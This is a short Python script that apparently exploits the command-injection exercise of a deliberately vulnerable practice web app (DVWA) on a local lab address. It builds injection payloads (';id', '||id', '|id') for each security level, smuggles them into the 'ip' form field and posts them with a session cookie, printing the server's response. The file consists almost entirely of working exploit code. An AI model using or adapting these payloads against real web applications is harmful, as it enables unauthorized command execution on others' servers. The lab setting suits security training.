from bs4 import BeautifulSoup as bs
import re
import requests

security="high"
url='http://192.168.1.163:8082/vulnerabilities/exec/'
valid_ip = '8.8.8.8'
injection = {
                'low' : ';id', 
                'med' : '||id', 
                'hig' : '|id'}

cookies = {'security':security,
           'PHPSESSID':'9no6gmk1eqr2dps9lccqic71t5'
           }

def payloads(ip=valid_ip, injection=injection, security=security):
    if security == 'low':
     return { 'ip': ip + injection['low'], 'Submit':'Submit' }
    elif security == 'medium':
     return { 'ip': injection['med'], 'Submit':'Submit' }
    elif security == 'high':
     return { 'ip': injection['hig'], 'Submit':'Submit' }
    else:
        print("error")
        quit()
    
def testPasswords():
    data = payloads()
    r = createSession(data)
    print(r.text)
    
def createSession(data,security=security,url=url,cookies=cookies):

    if re.search(r"^(low|medium|high)$", security):
      s = requests.Session()
      #print(data)
      r = s.post(url, cookies=cookies, data=data)
    else:
        print(f"Security Level {security} not found")
        quit()

    return r

testPasswords()
